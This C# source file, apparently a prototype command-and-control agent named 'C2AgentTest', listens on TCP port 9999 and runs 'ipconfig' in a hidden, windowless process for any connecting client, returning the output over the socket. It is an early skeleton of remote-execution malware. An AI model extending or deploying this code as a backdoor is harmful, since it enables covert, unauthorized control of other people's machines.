using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace C2AgentTest
{
    class Program
    {
        private static readonly Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static readonly List<Socket> clientSockets = new List<Socket>();
        private const int BUFFER_SIZE = 2048;
        private const int PORT = 9999;
        private static readonly byte[] buffer = new byte[BUFFER_SIZE];
        private static string cmdOutput = "";

        static void Main()
        {
            Console.Title = "Server";
            SetupServer();
            Console.ReadLine(); // When we press enter close everything
            CloseAllSockets();
        }

        private static void SetupServer()
        {
            Console.WriteLine("Setting up server on port {0}...", PORT);
            serverSocket.Bind(new IPEndPoint(IPAddress.Any, PORT));
            serverSocket.Listen(0);
            serverSocket.BeginAccept(AcceptCallback, null);
            Console.WriteLine("Server setup complete");
        }

        /// <summary>
        /// Close all connected client (we do not need to shutdown the server socket as its connections
        /// are already closed with the clients).
        /// </summary>
        private static void CloseAllSockets()
        {
            foreach (Socket socket in clientSockets)
            {
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
            }

            serverSocket.Close();
        }

        private static void AcceptCallback(IAsyncResult AR)
        {
            Socket socket;

            try
            {
                socket = serverSocket.EndAccept(AR);
            }
            catch (ObjectDisposedException) // I cannot seem to avoid this (on exit when properly closing sockets)
            {
                return;
            }

            clientSockets.Add(socket);
            socket.BeginReceive(buffer, 0, BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket);
            Console.WriteLine("Client connected from, waiting for request...");
            serverSocket.BeginAccept(AcceptCallback, null);
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState;
            int received;

            try
            {
                received = current.EndReceive(AR);
            }
            catch (SocketException)
            {
                Console.WriteLine("Client forcefully disconnected");
                // Don't shutdown because the socket may be disposed and its disconnected anyway.
                current.Close();
                clientSockets.Remove(current);
                return;
            }

            byte[] recBuf = new byte[received];
            Console.WriteLine(received);
            Array.Copy(buffer, recBuf, received);
            string text = Encoding.UTF8.GetString(recBuf).Trim();
            Console.WriteLine("Received Text: '" + text.Trim() + "'");
            Console.WriteLine(text == "get time");

            if (text.ToLower() == "ipconfig") // Client requested time
            {
                //Console.WriteLine("Text is a get time request");
                //byte[] data = Encoding.UTF8.GetBytes(DateTime.Now.ToLongTimeString());
                //current.Send(data);
                //Console.WriteLine("Time sent to client");

                Console.WriteLine("Ipconfig requested");
                byte[] data = Encoding.UTF8.GetBytes(RunCommand("ipconfig"));
                current.Send(data);
                Console.WriteLine("Ipconfig data sent to client");
            }
            else if (text.ToLower() == "kill") // Client wants to exit gracefully
            {
                // Always Shutdown before closing
                current.Shutdown(SocketShutdown.Both);
                current.Close();
                clientSockets.Remove(current);
                Console.WriteLine("Client disconnected");
                return;
            }
            else
            {
                Console.WriteLine("Text is an invalid request");
                byte[] data = Encoding.UTF8.GetBytes("Invalid request\r\n");
                current.Send(data);
                Console.WriteLine("Warning Sent");
            }

            current.BeginReceive(buffer, 0, BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
        }

        private static string RunCommand(string cmd)
        {
            cmdOutput = "";
            
            ProcessStartInfo procStart = new ProcessStartInfo(cmd);
            procStart.UseShellExecute = false;
            procStart.ErrorDialog = false;
            procStart.CreateNoWindow = true;
            procStart.RedirectStandardOutput = true;
            procStart.RedirectStandardInput = true;
            procStart.RedirectStandardError = true;

            Process proc = new Process();
            proc.StartInfo = procStart;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            bool procStarted = proc.Start();

            StreamReader outputReader = proc.StandardOutput;
            cmdOutput += outputReader.ReadToEnd();
            StreamReader errorReader = proc.StandardError;
            cmdOutput += errorReader.ReadToEnd();
            proc.WaitForExit();

            return cmdOutput;
        }
    }
}